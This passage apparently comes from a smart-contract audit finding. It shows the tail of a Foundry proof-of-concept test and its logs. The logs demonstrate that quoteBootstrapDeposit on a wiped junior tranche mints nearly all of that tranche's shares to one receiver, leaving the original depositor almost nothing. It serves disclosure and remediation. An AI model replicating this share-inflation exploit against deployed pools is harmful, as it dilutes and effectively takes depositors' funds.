        emit log_string("be 0 and HousePool would revert HousePool__BootstrapSharesZero;");
        emit log_string("fresh (zero-supply) tranches keep quoting normally.");
    }
}
```


Logs:

```text
No files changed, compilation skipped

Ran 1 test for test/BootstrapQuoteWipedTranche.t.sol:BootstrapQuoteWipedTrancheTest
[PASS] test_PoC_BootstrapQuoteOnWipedJuniorMintsAstronomicalShares() (gas: 100615415)
Logs:
  =========================================================
  PoC: quoteBootstrapDeposit lacks the LOW-72 zero-principal
  guard - executed bootstrap mint on a wiped junior tranche
  =========================================================
  ---------------------------------------------------------
  funded pool (6-decimal USG):
  junior principal (seed $1 + victim $50k): 50000999982
  senior principal (seed $1 + senior $150k): 150001000018
  junior share supply (seed + victim): 50001450003600
  trader LONG opened (18-dec size): 65000000000000000000000
  ---------------------------------------------------------
  after the wipeout (projected deposit-pricing state):
  junior pricing principal: 0
  senior pricing principal: 148107624258
  junior share supply (survives the wipe): 50001450003600
  ---------------------------------------------------------
  estimateDepositShares(10_000e6) on wiped junior: 0
  (LOW-72 guard: indicative quote refused -> 0)
  quoteBootstrapDeposit(10_000e6) on wiped junior: 500014500046000000000000
    = QUOTE_ASSETS * (supply + 1000) / (0 + 1): 500014500046000000000000
  quoteBootstrapDeposit(10_000e6) on healthy senior: 10127655534464
  (healthy tranche quotes pro-rata)
  ordinary deposit on wiped junior: reverted TrancheVault__TerminallyWiped
  engine.recapitalizePool by owner: 50000000000
  unassignedAssets before assign (pending bucket): 0
  assignUnassignedAssets(true, ...): reverted HousePool__ExceedsSeniorDepositCapacity
  (senior vector capacity-blocked; junior vector below)
  ---------------------------------------------------------
  assignUnassignedAssets(false, receiver) executed:
  unassigned amount assigned: 48106619674
  executed quote = amount * (supply + 1000) shares: 2405400738519817750500400
  shares minted to receiver: 2405400738519817750500400
  junior principal after assign: 48106619674
  junior supply after assign: 2405400738569819200504000
  unassignedAssets after assign: 0
  senior principal after assign: 150001004584
  receiver share of junior tranche (1e9 = 100%):
    receiverShares * 1e9 / total: 999999999
  victim residual share of tranche (1e18 = 100%): 20786744
  ---------------------------------------------------------
  With the LOW-72 guard in quoteBootstrapDeposit the quote would
  be 0 and HousePool would revert HousePool__BootstrapSharesZero;
  fresh (zero-supply) tranches keep quoting normally.

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.27ms (18.44ms CPU time)

Ran 1 test suite in 22.23ms (19.27ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
